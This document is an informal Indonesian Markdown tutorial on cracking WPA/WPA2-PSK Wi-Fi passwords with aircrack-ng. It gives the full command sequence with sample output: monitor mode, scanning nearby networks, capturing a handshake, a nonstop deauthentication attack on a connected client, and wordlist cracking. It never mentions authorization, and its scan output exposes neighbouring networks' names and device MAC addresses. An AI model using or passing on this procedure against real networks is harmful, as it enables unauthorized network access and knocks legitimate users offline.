# Hack Wi-Fi WPA/WPA2-PSK

## Persyaratan
- OS Linux
- Adapter Wi-Fi (support mode monitor)
- Aircrack-NG suite
- Wordlist

## Instal Tool

```
sudo apt-get update
sudo apt-get install aircrack-ng
```

## Langkah-Langkah

#### 1. Aktifin Mode Monitor

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

Keterangan:
- `[interface]` : Interface yang mau lu pake, contoh: `wlan0`.

#### 2. Scan Wi-Fi

```
sudo airodump-ng [interface]
```

Output:

```
CH 11 ][ Elapsed: 6 s ][ 2026-01-20 12:20                                                                                             
                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                   
                                                                                                                                       
 04:CC:BC:1A:8B:54  -98  18       10        0    0  11  130   WPA2 CCMP   PSK  HUAWEI-2.4G-Jq7W                                        
 E0:1F:88:63:5E:EC  -98  26       15        0    0  11  180   WPA2 CCMP   PSK  Redmi                                                   
 84:16:F9:FE:64:68  -31  96       62       13    3  11  130   WPA2 CCMP   PSK  LATIHAN                                                 
                                                                                                                                       
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                     
                                                                                                                                       
 (not associated)   00:0C:E7:5C:F3:02  -85    0 - 1      3       17         NIKO UDON,Zulfa ,RUMAH ARSYLA                              
 84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -31    0 - 1e     1       23 
```

#### 3. Catet Info Penting

Lu harus nyatet ifo ini, biar lu kaga bulak balik pake tool `airodump-ng`:
1. `ESSID` : Nama Wi-Fi
2. `BSSID` : MAC address AP
3. `CH` : Channel AP
4. `STATION` : Client yang konek sama AP

#### 4. Capture Handshake

```
sudo airodump-ng -N [essid] -d [bssid] -c [channel] -w [output] [interface]
```

Keterangan:
- `-N` : ESSID target
- `-d` : BSSID target
- `-c` : Channel target
- `-w` : Output file capture

Pastiin minimal ada 1 client yang konek:

```
CH 11 ][ Elapsed: 0 s ][ 2026-01-20 12:55                                                                     
                                                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                           
                                                                                                               
 84:16:F9:FE:64:68  -34 100       33       11    5  11  130   WPA2 CCMP   PSK  LATIHAN                         
                                                                                                               
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                             
                                                                                                               
 84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -37    0 - 1      0       10 
```

#### 5. Jalanin Serangan Deauth

```
sudo aireplay-ng -0 0 -a [bssid] -c [mac_client] [interface]
```

Keterangan:
- `-0` : Ngasih tau `aireplay-ng` bahwa lu mau jalanin serangan deauth
- `0` : Deauth secara terus terusan (nonstop)
- `-a` : MAC address AP
- `-c` : MAC address client

Output:

```
13:01:50  Waiting for beacon frame (BSSID: 84:16:F9:FE:64:68) on channel 11
13:01:50  Sending 64 directed DeAuth (code 7). STMAC: [4A:F2:3B:A2:12:29] [ 0| 0 ACKs]
13:01:51  Sending 64 directed DeAuth (code 7). STMAC: [4A:F2:3B:A2:12:29] [ 0| 0 ACKs]
13:01:52  Sending 64 directed DeAuth (code 7). STMAC: [4A:F2:3B:A2:12:29] [ 0| 0 ACKs]
13:01:53  Sending 64 directed DeAuth (code 7). STMAC: [4A:F2:3B:A2:12:29] [ 0| 0 ACKs]
```

#### 6. Monitoring Hasil

Pastiin di output capture handshake outputnya kaya gini:

```
CH 11 ][ Elapsed: 6 s ][ 2026-01-20 13:03 ][ WPA handshake: 84:16:F9:FE:64:68                                 
                                                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                           
                                                                                                               
 84:16:F9:FE:64:68  -38 100       63       25    8  11  130   WPA2 CCMP   PSK  LATIHAN                         
                                                                                                               
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                             
                                                                                                               
 84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -33    1e- 1e     0       14  EAPOL
```

Tanda handshake udah didapetin apa belom outputnya kaya gini:

```
WPA handshake: 84:16:F9:FE:64:68
```

Kalo udah dapet, teken `CTRL+C`.

#### 7. Lihat Hasil Capture

File yang dihasilin sama tool `airodump-ng`:

```
LATIHAN-01.cap
LATIHAN-01.csv
LATIHAN-01.kismet.csv
LATIHAN-01.kismet.netxml
LATIHAN-01.log.csv
```

File yang dipake buat crack handshake, ekstensinya `.cap`.

#### 8. Crack Handshake

```
aircrack-ng -a 2 -e [essid] -b [bssid] -l [output] [file_capture] -w [wordlist]
```

Keterangan:
- `-a` : Jenis serangan yang mau lu pake, `2` artinya buat WPA/WPA2-PSK
- `-e` : ESSID target
- `-b` : BSSID target
- `-l` : Nyimpen hasil password Wi-Fi yang berhasil dicrack ke file
- `[file_capture]`: File capture yang berisi handshake
- `-w`: Wordlist yang mau lu pake buat crack handshake

Output:

```
    Aircrack-ng 1.7 

      [00:00:00] 19/10303727 keys tested (151.74 k/s) 

      Time left: 18 hours, 51 minutes, 45 seconds                0.00%

                           KEY FOUND! [ 12345678 ]


      Master Key     : 8E F5 3E A1 40 2E CD 88 F6 86 74 BE 43 37 0E 7E 
                       A6 CD 79 C3 CB 7E 35 81 48 4B A1 23 B9 B9 40 87 

      Transient Key  : A3 9F 7F C0 3D AF 30 31 CB 4A 09 A3 8A C2 40 CC 
                       90 88 B2 96 FC B0 30 47 FC 06 EA A2 80 CB 5B F4 
                       B7 10 3D BB F7 C2 C2 85 4C D8 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : D2 F4 D4 B6 D0 9D 2E F4 2D 62 A7 6D 29 02 E3 0A
```

Dari output di atas, `aircrack-ng` berhasil ngecrack handshake dan nemuin password Wi-Fi nya.

Password nya: `12345678`

#### 9. Balikin Interface

Nah, kan lu udah dapet password Wi-Fi nya, biar lu bisa internetan lagi, lu harus balikin network lu, caranya:

```
sudo ip l set [interface] down
sudo iw dev [interface] set type managed
sudo ip l set [interface] up
sudo systemctl restart NetworkManager
```

## Troubelshoot
- Kalo pas scannig Wi-Fi kaga ada outputnya, coba lu lepas adapter Wi-Fi nya dari VM, terus lu colok lagi.
- Kalo pas capture handshake lu lama dapet handshake nya, itu ada dua kemungkinan:
  1. Sinyal/Power AP target lemah (minimal: `-35` sampe `-60` dBm)
  2. Kaga ada client yang reconnect
- Kalo output `aircrack-ng` outputnya `KEY NOT FOUND`, itu artinya password Wi-Fi target kaga ada di wordlist lu. Lu harus pake wordlist yang mengandung password Wi-Fi target.
